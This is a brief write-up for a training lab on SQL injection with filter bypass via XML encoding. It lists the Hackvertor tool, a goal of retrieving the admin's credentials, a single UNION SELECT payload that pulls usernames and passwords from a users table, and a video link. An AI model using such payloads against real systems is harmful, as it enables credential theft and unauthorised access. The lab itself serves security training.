# Lab #17 - SQL injection with filter bypass via XML encoding

```
This lab requires the use of the Hackvertor extension. 
If you are unable to download it via BurpSuite's built-in BAPP store, 
then you can download, and install it manually from portswigger.net:
```
https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100


 ## End Goal: 
**Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.**


 ### Analysis:
```
1 UNION SELECT username || '~'  || password  FROM users
```
**Video:**
[SQL Injection - Lab #17 SQL injection with filter bypass via XML encoding](https://youtu.be/ELdyZm0nK4g?feature=shared)
